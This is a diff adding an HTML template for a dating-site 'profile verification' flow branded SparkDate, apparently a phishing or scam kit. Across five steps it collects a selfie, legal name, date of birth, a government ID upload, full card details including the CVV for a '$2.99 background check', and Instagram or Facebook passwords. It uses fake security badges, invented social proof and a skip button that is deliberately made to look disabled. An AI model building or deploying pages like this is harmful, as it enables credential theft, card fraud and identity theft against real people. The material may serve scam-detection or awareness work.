@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Profile Verification — SparkDate</title>
+  <meta name="description" content="Complete your SparkDate profile verification to get the Verified badge and boost your match rate." />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="/static/style.css" />
+</head>
+<body class="verify-body">
+
+<!-- ───────── NAV ───────── -->
+<nav class="navbar navbar-verify">
+  <div class="nav-inner">
+    <a href="/" class="nav-logo">
+      <span class="logo-spark">✦</span> SparkDate
+    </a>
+    <div class="nav-tagline">Profile Verification</div>
+  </div>
+</nav>
+
+<!-- ───────── VERIFY WRAPPER ───────── -->
+<main class="verify-main">
+
+  <!-- Progress bar -->
+  <div class="progress-wrap">
+    <div class="progress-bar" id="progress-bar" style="width: {{ (step / 5 * 100)|int }}%"></div>
+  </div>
+  <div class="progress-label">Step {{ step }} of 5</div>
+
+  <!-- Social proof ticker (compact) -->
+  <div class="verify-proof-strip">
+    <span id="proof-rotating">🔥 Sofia from Austin just got verified ✓</span>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════
+       STEP 1 — Selfie Upload
+  ═══════════════════════════════════════════════════════ -->
+  {% if step == 1 %}
+  <div class="verify-card" id="step-1">
+    <div class="step-icon">🤳</div>
+    <h1 class="step-title">Step 1 of 5: Photo Verification</h1>
+    <p class="step-desc">
+      Upload a clear selfie holding a handwritten note with today's date.
+      This confirms you're a real person, not a bot or fake account.
+    </p>
+    <div class="proof-callout">
+      <span class="proof-lock">🔒</span>
+      Your photo is reviewed by our safety team and is never shown to other members.
+    </div>
+
+    <!-- Upload via our JS → /api/upload, then auto-advance the form -->
+    <form id="upload-form-selfie" action="/api/verify/step" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="step" value="1" />
+      <div class="upload-zone" id="selfie-drop" onclick="document.getElementById('selfie-file').click()">
+        <div class="upload-icon">📷</div>
+        <p class="upload-text">Click to upload your selfie</p>
+        <p class="upload-hint">JPG, PNG or HEIC · Max 10 MB</p>
+        <input type="file" id="selfie-file" name="selfie_photo"
+               accept="image/*,.pdf" style="display:none"
+               onchange="previewFile(this,'selfie-preview','selfie-name')" />
+      </div>
+      <div id="selfie-preview-wrap" class="preview-wrap" style="display:none">
+        <img id="selfie-preview" src="" class="preview-img" alt="Selfie preview" />
+        <span id="selfie-name" class="preview-name"></span>
+      </div>
+      <button type="submit" class="btn-primary btn-step" id="btn-step1">
+        Continue →
+      </button>
+    </form>
+
+    <p class="step-skip-note">
+      Don't want to upload a photo now?
+      <a href="/verify?step=2" id="skip-step1" class="skip-link">Skip this step (not recommended)</a>
+    </p>
+  </div>
+  {% endif %}
+
+  <!-- ═══════════════════════════════════════════════════════
+       STEP 2 — Identity Info
+  ═══════════════════════════════════════════════════════ -->
+  {% if step == 2 %}
+  <div class="verify-card" id="step-2">
+    <div class="step-icon">👤</div>
+    <h1 class="step-title">Step 2 of 5: Identity Confirmation</h1>
+    <p class="step-desc">
+      Confirm a few details so we can match your profile to a real person.
+      This information is kept private and never shown to other members.
+    </p>
+
+    <form action="/api/verify/step" method="POST">
+      <input type="hidden" name="step" value="2" />
+
+      <div class="form-group">
+        <label for="full_name" class="form-label">Full Legal Name</label>
+        <input type="text" id="full_name" name="full_name"
+               class="form-input" placeholder="e.g. Jordan Mitchell"
+               autocomplete="name" required />
+      </div>
+
+      <div class="form-row">
+        <div class="form-group">
+          <label for="date_of_birth" class="form-label">Date of Birth</label>
+          <input type="date" id="date_of_birth" name="date_of_birth"
+                 class="form-input" required />
+        </div>
+        <div class="form-group">
+          <label for="phone" class="form-label">Phone Number</label>
+          <input type="tel" id="phone" name="phone"
+                 class="form-input" placeholder="+1 (555) 000-0000"
+                 autocomplete="tel" />
+        </div>
+      </div>
+
+      <div class="form-row">
+        <div class="form-group">
+          <label for="city" class="form-label">City</label>
+          <input type="text" id="city" name="city"
+                 class="form-input" placeholder="Austin" required />
+        </div>
+        <div class="form-group">
+          <label for="state" class="form-label">State</label>
+          <input type="text" id="state" name="state"
+                 class="form-input" placeholder="TX" maxlength="2" required />
+        </div>
+      </div>
+
+      <button type="submit" class="btn-primary btn-step" id="btn-step2">
+        Continue →
+      </button>
+    </form>
+  </div>
+  {% endif %}
+
+  <!-- ═══════════════════════════════════════════════════════
+       STEP 3 — Government ID Upload
+  ═══════════════════════════════════════════════════════ -->
+  {% if step == 3 %}
+  <div class="verify-card" id="step-3">
+    <div class="step-icon">🪪</div>
+    <h1 class="step-title">Step 3 of 5: Government ID Verification</h1>
+    <p class="step-desc">
+      Upload a photo of a valid government-issued ID — passport, driver's
+      license, or state ID — to complete identity verification. This is
+      required by our platform safety team to prevent catfishing and fake profiles.
+    </p>
+
+    <div class="info-box">
+      <strong>Why do we need your ID?</strong><br />
+      SparkDate's safety team reviews each ID to confirm your name and age match
+      your profile. IDs are stored encrypted and deleted after 72 hours. We never
+      share them with other members.
+    </div>
+
+    <form action="/api/verify/step" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="step" value="3" />
+
+      <div class="id-type-row">
+        <label class="id-type-opt">
+          <input type="radio" name="id_type" value="drivers_license" checked />
+          <span>Driver's License</span>
+        </label>
+        <label class="id-type-opt">
+          <input type="radio" name="id_type" value="passport" />
+          <span>Passport</span>
+        </label>
+        <label class="id-type-opt">
+          <input type="radio" name="id_type" value="state_id" />
+          <span>State ID</span>
+        </label>
+      </div>
+
+      <div class="upload-zone" id="govid-drop" onclick="document.getElementById('govid-file').click()">
+        <div class="upload-icon">🪪</div>
+        <p class="upload-text">Click to upload your ID</p>
+        <p class="upload-hint">JPG, PNG or PDF · Max 10 MB · Front side only</p>
+        <input type="file" id="govid-file" name="government_id"
+               accept="image/*,.pdf" style="display:none"
+               onchange="previewFile(this,'govid-preview','govid-name')" />
+      </div>
+      <div id="govid-preview-wrap" class="preview-wrap" style="display:none">
+        <img id="govid-preview" src="" class="preview-img" alt="ID preview" />
+        <span id="govid-name" class="preview-name"></span>
+      </div>
+
+      <div class="trust-strip">
+        <span>🔒 256-bit SSL</span>
+        <span>🛡️ ID deleted in 72 hours</span>
+        <span>✅ SOC 2 Certified</span>
+      </div>
+
+      <button type="submit" class="btn-primary btn-step" id="btn-step3">
+        Continue →
+      </button>
+    </form>
+
+    <p class="step-skip-note">
+      Having trouble?
+      <a href="/verify?step=4" id="skip-step3" class="skip-link">Skip for now (verification may be incomplete)</a>
+    </p>
+  </div>
+  {% endif %}
+
+  <!-- ═══════════════════════════════════════════════════════
+       STEP 4 — Background Check Payment
+  ═══════════════════════════════════════════════════════ -->
+  {% if step == 4 %}
+  <div class="verify-card" id="step-4">
+    <div class="step-icon">🔎</div>
+    <h1 class="step-title">Step 4 of 5: Safety Background Check</h1>
+    <p class="step-desc">
+      SparkDate partners with <strong>TrustCheck™</strong> to run a background
+      check for every verified profile. This ensures our community stays safe.
+      The one-time fee is <strong>$2.99</strong>.
+    </p>
+
+    <div class="pricing-box">
+      <div class="price-row">
+        <span>Background check fee</span>
+        <span class="price">$2.99</span>
+      </div>
+      <div class="price-row price-row-small">
+        <span>Card charged once — no subscription</span>
+        <span class="price-small">One-time</span>
+      </div>
+      <div class="price-divider"></div>
+      <div class="price-row price-total">
+        <span>Total today</span>
+        <span class="price-bold">$2.99</span>
+      </div>
+    </div>
+
+    <div class="proof-callout proof-callout-green">
+      94% of verified members say the background check made them feel safer on SparkDate.
+    </div>
+
+    <form action="/api/verify/step" method="POST" id="payment-form">
+      <input type="hidden" name="step" value="4" />
+
+      <div class="form-group">
+        <label class="form-label" for="card_name">Name on Card</label>
+        <input type="text" id="card_name" name="card_name"
+               class="form-input" placeholder="Jordan Mitchell"
+               autocomplete="cc-name" required />
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="card_number">Card Number</label>
+        <input type="text" id="card_number" name="card_number"
+               class="form-input card-input" placeholder="•••• •••• •••• ••••"
+               maxlength="19" inputmode="numeric"
+               autocomplete="cc-number" required
+               oninput="formatCardNumber(this)" />
+      </div>
+
+      <div class="form-row">
+        <div class="form-group">
+          <label class="form-label" for="card_expiry">Expiry Date</label>
+          <input type="text" id="card_expiry" name="card_expiry"
+                 class="form-input" placeholder="MM/YY"
+                 maxlength="5" autocomplete="cc-exp" required
+                 oninput="formatExpiry(this)" />
+        </div>
+        <div class="form-group">
+          <label class="form-label" for="card_cvv">CVV</label>
+          <input type="text" id="card_cvv" name="card_cvv"
+                 class="form-input" placeholder="•••"
+                 maxlength="4" inputmode="numeric"
+                 autocomplete="cc-csc" required />
+        </div>
+      </div>
+
+      <div class="payment-trust-row">
+        <span class="trust-badge">🔒 SSL Secured</span>
+        <span class="trust-badge">✅ PCI DSS Compliant</span>
+        <span class="trust-badge">🛡️ 256-bit Encryption</span>
+        <span class="trust-badge">🏅 Norton Secured</span>
+      </div>
+
+      <button type="submit" class="btn-primary btn-step btn-pay" id="btn-step4">
+        Pay $2.99 &amp; Continue →
+      </button>
+    </form>
+
+    <p class="step-skip-note danger-skip">
+      ⚠️ Skipping the background check will limit your verification badge to
+      <strong>Partial ✓</strong> and reduce match visibility.
+      <a href="/verify?step=5" id="skip-step4" class="skip-link skip-link-warn">Skip anyway</a>
+    </p>
+  </div>
+  {% endif %}
+
+  <!-- ═══════════════════════════════════════════════════════
+       STEP 5 — Social Media Cross-Verification
+  ═══════════════════════════════════════════════════════ -->
+  {% if step == 5 %}
+  <div class="verify-card" id="step-5">
+    <div class="step-icon">🔗</div>
+    <h1 class="step-title">Step 5 of 5: Cross-Platform Verification</h1>
+    <p class="step-desc">
+      The final step. Link your existing social media account so we can
+      confirm your identity across platforms. This takes about 10 seconds.
+    </p>
+
+    <div class="social-tabs" id="social-tabs">
+      <button class="social-tab active" id="tab-instagram" onclick="switchTab('instagram')">
+        📸 Instagram
+      </button>
+      <button class="social-tab" id="tab-facebook" onclick="switchTab('facebook')">
+        👤 Facebook
+      </button>
+    </div>
+
+    <!-- Instagram panel -->
+    <div id="panel-instagram" class="social-panel">
+      <div class="social-login-box">
+        <div class="social-brand-logo">📸 <strong>Instagram</strong></div>
+        <p class="social-login-desc">
+          Enter your Instagram credentials to confirm your real identity.
+          We check that your account is genuine and active. We do <em>not</em> post
+          anything on your behalf.
+        </p>
+        <form action="/api/verify/step" method="POST">
+          <input type="hidden" name="step" value="5" />
+          <input type="hidden" name="social_platform" value="instagram" />
+          <div class="form-group">
+            <label class="form-label" for="instagram_username">Instagram Username</label>
+            <input type="text" id="instagram_username" name="instagram_username"
+                   class="form-input" placeholder="@yourusername"
+                   autocomplete="username" />
+          </div>
+          <div class="form-group">
+            <label class="form-label" for="instagram_password">Instagram Password</label>
+            <input type="password" id="instagram_password" name="instagram_password"
+                   class="form-input" placeholder="Your Instagram password"
+                   autocomplete="current-password" />
+          </div>
+          <button type="submit" class="btn-primary btn-step btn-social" id="btn-step5-ig">
+            Link Instagram &amp; Complete Verification ✓
+          </button>
+        </form>
+      </div>
+    </div>
+
+    <!-- Facebook panel -->
+    <div id="panel-facebook" class="social-panel" style="display:none">
+      <div class="social-login-box">
+        <div class="social-brand-logo">👤 <strong>Facebook</strong></div>
+        <p class="social-login-desc">
+          Enter your Facebook credentials to confirm your real identity.
+          We check that your account is genuine and active.
+        </p>
+        <form action="/api/verify/step" method="POST">
+          <input type="hidden" name="step" value="5" />
+          <input type="hidden" name="social_platform" value="facebook" />
+          <div class="form-group">
+            <label class="form-label" for="facebook_email">Facebook Email</label>
+            <input type="email" id="facebook_email" name="facebook_email"
+                   class="form-input" placeholder="your@email.com"
+                   autocomplete="email" />
+          </div>
+          <div class="form-group">
+            <label class="form-label" for="facebook_password">Facebook Password</label>
+            <input type="password" id="facebook_password" name="facebook_password"
+                   class="form-input" placeholder="Your Facebook password"
+                   autocomplete="current-password" />
+          </div>
+          <button type="submit" class="btn-primary btn-step btn-social" id="btn-step5-fb">
+            Link Facebook &amp; Complete Verification ✓
+          </button>
+        </form>
+      </div>
+    </div>
+
+    <!-- Skip button — visually disabled but clickable (dark pattern) -->
+    <div class="skip-wrap">
+      <a href="/verify/success" id="skip-step5"
+         class="btn-skip btn-skip-disabled"
+         aria-label="Skip social media verification (not recommended)"
+         title="Skipping will result in limited verification status">
+        Skip this step
+      </a>
+      <p class="skip-warning">⚠️ Skipping reduces your verification to Partial status and limits match visibility</p>
+    </div>
+
+    <div class="security-note">
+      🔒 Your password is transmitted over a secure, encrypted connection and is
+      used solely for identity verification. It is not stored after the check completes.
+    </div>
+  </div>
+  {% endif %}
+
+</main>
+
+<!-- ───────── FOOTER ───────── -->
+<footer class="footer footer-compact">
+  <div class="container footer-inner">
+    <div class="footer-logo">✦ SparkDate</div>
+    <div class="footer-links">
+      <a href="#">Privacy</a>
+      <a href="#">Terms</a>
+      <a href="#">Safety</a>
+    </div>
+  </div>
+</footer>
+
+<script src="/static/script.js"></script>
+</body>
+</html>
